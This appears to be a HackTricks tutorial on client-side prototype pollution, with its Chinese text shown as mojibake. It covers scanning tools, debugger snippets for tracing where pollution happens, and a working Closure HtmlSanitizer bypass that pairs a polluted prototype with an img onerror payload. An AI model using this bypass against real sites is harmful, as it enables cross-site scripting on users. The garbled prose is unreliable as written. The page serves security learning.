# å®¢æˆ·ç«¯åŸå‹æ±¡æŸ“

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–è€…**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·å‘ç°

å·¥å…· [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **å’Œ** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) å¯ä»¥ç”¨æ¥**å‘ç°åŸå‹æ±¡æŸ“æ¼æ´**ã€‚

æ­¤å¤–ï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨**æµè§ˆå™¨æ‰©å±•** [**PPScan**](https://github.com/msrkp/PPScan) æ¥**è‡ªåŠ¨** **æ‰«æ** ä½ **è®¿é—®**çš„**é¡µé¢**æ˜¯å¦å­˜åœ¨åŸå‹æ±¡æŸ“æ¼æ´ã€‚

### è°ƒè¯•å±æ€§è¢«ä½¿ç”¨çš„ä½ç½® <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### æŸ¥æ‰¾åŸå‹æ±¡æŸ“æ ¹æœ¬åŸå›  <a href="#5530" id="5530"></a>

ä¸€æ—¦ä»»ä½•å·¥å…·**è¯†åˆ«**åˆ°**åŸå‹æ±¡æŸ“æ¼æ´**ï¼Œå¦‚æœ**ä»£ç **å¹¶**ä¸**æ˜¯å¾ˆ**å¤æ‚**ï¼Œä½ å¯ä»¥åœ¨Chromeå¼€å‘è€…å·¥å…·ä¸­**æœç´¢**JSä»£ç ä¸­çš„**å…³é”®è¯** **`location.hash/decodeURIComponent/location.search`** æ¥æ‰¾åˆ°æ˜“å—æ”»å‡»çš„åœ°æ–¹ã€‚

å¦‚æœä»£ç åºå¤§ä¸”å¤æ‚ï¼Œæœ‰ä¸€ä¸ªç®€å•çš„æ–¹æ³•å¯ä»¥**å‘ç°å“ªé‡Œçš„ä»£ç å­˜åœ¨æ¼æ´**ï¼š

* ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªå·¥å…·**æ‰¾åˆ°ä¸€ä¸ªæ¼æ´**å¹¶è·å–ä¸€ä¸ª**payload**ï¼Œè¿™ä¸ªpayloadå°†ä¼šåœ¨æ„é€ å‡½æ•°ä¸­**è®¾ç½®ä¸€ä¸ªå±æ€§**ã€‚åœ¨ppmapä¸­ï¼Œä½ ä¼šå¾—åˆ°ç±»ä¼¼è¿™æ ·çš„ä¸œè¥¿ï¼š`constructor[prototype][ppmap]=reserved`
* ç°åœ¨ï¼Œåœ¨å°†è¦åœ¨é¡µé¢ä¸Šæ‰§è¡Œçš„JSä»£ç çš„**ç¬¬ä¸€è¡Œè®¾ç½®ä¸€ä¸ªæ–­ç‚¹**ï¼Œå¹¶ç”¨payloadåˆ·æ–°é¡µé¢ï¼Œè¿™æ ·**æ‰§è¡Œå°±ä¼šåœ¨é‚£é‡Œæš‚åœ**ã€‚
* å½“JSæ‰§è¡Œæš‚åœæ—¶ï¼Œåœ¨JSæ§åˆ¶å°ä¸­**ç²˜è´´ä»¥ä¸‹è„šæœ¬**ã€‚è¿™æ®µä»£ç å°†ä¼šæŒ‡ç¤º'ppmap'å±æ€§ä½•æ—¶è¢«åˆ›å»ºï¼Œè¿™æ ·ä½ å°±èƒ½æ‰¾åˆ°å®ƒæ˜¯åœ¨å“ªé‡Œåˆ›å»ºçš„ã€‚
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if ( debugGet )
debugger;
return origValue;
},
set: function(val) {
debugger;
return origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
è¿”å›**Sources**å¹¶ç‚¹å‡»â€œ**Resume** è„šæœ¬**æ‰§è¡Œ**â€ã€‚å®Œæˆåï¼Œæ•´ä¸ª**javascript**å°†ä¼šå¦‚é¢„æœŸåœ°è¢«**æ‰§è¡Œ**ï¼Œppmapä¹Ÿä¼šå†æ¬¡è¢«æ±¡æŸ“ã€‚å€ŸåŠ©Snippetï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ppmapå±æ€§ç¡®åˆ‡è¢«æ±¡æŸ“çš„ä½ç½®ã€‚æˆ‘ä»¬å¯ä»¥ç‚¹å‡»**Call** **Stack**ï¼Œä½ å°†ä¼šçœ‹åˆ°**ä¸åŒçš„**æ ˆï¼Œè¿™äº›æ ˆæ˜¯**æ±¡æŸ“**å‘ç”Ÿçš„åœ°æ–¹ã€‚

ä½†æ˜¯æˆ‘ä»¬åº”è¯¥é€‰æ‹©å“ªä¸€ä¸ªå‘¢ï¼Ÿå¤§å¤šæ•°æƒ…å†µä¸‹Prototype Pollutionå‘ç”Ÿåœ¨Javascriptåº“ä¸­ï¼Œå› æ­¤ç›®æ ‡æ˜¯ä¸.jsåº“æ–‡ä»¶å…³è”çš„æ ˆï¼ˆå°±åƒå›¾ç‰‡ä¸­çš„å³ä¾§ä¸€æ ·ï¼ŒæŸ¥çœ‹æ ˆå…³è”åˆ°å“ªä¸ªç«¯ç‚¹ï¼‰ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åœ¨ç¬¬4è¡Œå’Œç¬¬6è¡Œæœ‰ä¸¤ä¸ªæ ˆï¼Œé€»è¾‘ä¸Šæˆ‘ä»¬ä¼šé€‰æ‹©ç¬¬4è¡Œï¼Œå› ä¸ºé‚£æ˜¯æ±¡æŸ“é¦–æ¬¡å‘ç”Ÿçš„åœ°æ–¹ï¼Œè¿™æ„å‘³ç€è¿™ä¸€è¡Œæ˜¯æ¼æ´çš„åŸå› ã€‚ç‚¹å‡»æ ˆå°†ä¼šé‡å®šå‘æˆ‘ä»¬åˆ°å­˜åœ¨æ¼æ´çš„ä»£ç ã€‚

![](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## å¯»æ‰¾è„šæœ¬å°å·¥å…·

å°å·¥å…·æ˜¯**ä¸€æ—¦å‘ç°PPæ¼æ´å°†è¢«æ»¥ç”¨çš„ä»£ç **ã€‚

å¦‚æœåº”ç”¨ç¨‹åºå¾ˆç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥æœç´¢åƒ**`srcdoc/innerHTML/iframe/createElement`**è¿™æ ·çš„**å…³é”®è¯**ï¼Œå®¡æŸ¥æºä»£ç ï¼Œæ£€æŸ¥æ˜¯å¦ä¼š**å¯¼è‡´javascriptæ‰§è¡Œ**ã€‚æœ‰æ—¶å€™ï¼Œä¸Šè¿°æŠ€æœ¯å¯èƒ½æ ¹æœ¬æ‰¾ä¸åˆ°å°å·¥å…·ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œçº¯ç²¹çš„æºä»£ç å®¡æŸ¥ä¼šæ­ç¤ºä¸€äº›åƒä¸‹é¢ä¾‹å­ä¸­çš„å¥½å°å·¥å…·ã€‚

### ç¤ºä¾‹ åœ¨Mithilåº“ä»£ç ä¸­å¯»æ‰¾PPå°å·¥å…·

æŸ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š[https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## ä¸ºæ˜“å—æ”»å‡»çš„åº“é‡æ–°ç¼–è¯‘æœ‰æ•ˆè½½è·

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## é€šè¿‡PPç»•è¿‡HTML Sanitizers

[**è¿™é¡¹ç ”ç©¶**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)å±•ç¤ºäº†ä½¿ç”¨PPå°å·¥å…·æ¥**ç»•è¿‡**ä¸€äº›HTML sanitizersåº“æä¾›çš„æ¸…æ´å¤„ç†ï¼š

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

* #### Closure
```html
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## å‚è€ƒèµ„æ–™

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricks**ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
